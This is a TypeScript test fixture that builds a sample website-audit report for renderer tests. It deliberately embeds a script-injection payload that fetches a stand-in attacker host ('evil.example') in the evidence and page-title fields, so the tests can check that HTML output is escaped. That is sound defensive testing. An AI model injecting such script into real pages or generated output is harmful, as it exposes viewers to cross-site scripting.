/**
 * One prepared document, shared by the renderer tests.
 *
 * NOT A TEST FILE and shipped nowhere: only `*.test.mts` imports it, and it
 * holds no assertions. It exists so the shell tests and the browser tests argue
 * about the same document.
 *
 * IT IS DELIBERATELY HOSTILE. The audited site's own title, its evidence and
 * one of its addresses are written the way an attacker would write them,
 * because a fixture of polite data proves only that polite data is safe. The
 * renderer builds HTML, so a fixture that never contains a tag would never
 * exercise the one thing that choosing a browser cost us.
 */
import type { PdfDocument } from "../pdfDocument.ts";

/** Markup an audited page could genuinely serve, and a model could echo back. */
export const HOSTILE = '<script>fetch("https://evil.example")</script>';

/** A sentinel that appears nowhere in this file except as document content. */
export const SENTINEL = "ZZQQ-RENDERER-SENTINEL";

export function testDocument(overrides: Partial<PdfDocument> = {}): PdfDocument {
  return {
    cover: {
      client: { companyName: "Example Company Ltd", contactName: null, preparedBy: null },
      auditedUrl: "https://example.com/",
      requestedUrl: null,
      // Already a sentence. The projection phrases it; the renderer prints it.
      checkedAt: "8 September 2026 at 10:00 UTC",
      partial: false,
      statusLine: "Website audit complete",
    },
    coverage: {
      partial: false,
      headline: "What we checked",
      stopReason: null,
      facts: [{ label: "Pages read", value: "128" }],
    },
    summary: {
      severityCounts: [{ severity: "high", label: "High", count: 1 }],
      state: "findings",
      stateSentence: "",
      ai: null,
    },
    siteFindings: {
      heading: "Site-wide issues",
      intro: "These apply to the whole website.",
      count: 1,
      groups: [
        {
          category: "security",
          label: "Security",
          findings: [
            {
              ruleId: "security.dns.spf.missing",
              title: "No SPF record",
              category: "security",
              categoryLabel: "Security",
              severity: "high",
              severityLabel: "High",
              scope: "site",
              scopeLabel: "Site-wide",
              reach: null,
              evidence: `No SPF record was found. ${HOSTILE}`,
              remediation: "Publish an SPF record for this domain.",
              affected: [],
              affectedNote: null,
              commentary: null,
            },
          ],
        },
      ],
    },
    pageFindings: {
      heading: "Page-level issues",
      intro: "These were found on individual pages.",
      count: 0,
      groups: [],
    },
    skipped: null,
    speed: {
      measured: false,
      status: "not-requested",
      message: "Speed was not measured. It is an optional extra check.",
    },
    measured: [
      { heading: `Measured facts ${SENTINEL}`, facts: [{ label: "Page title", value: HOSTILE }] },
    ],
    coverageDetail: [{ heading: "Crawl limits", facts: [{ label: "Page limit", value: "150" }] }],
    ...overrides,
  };
}
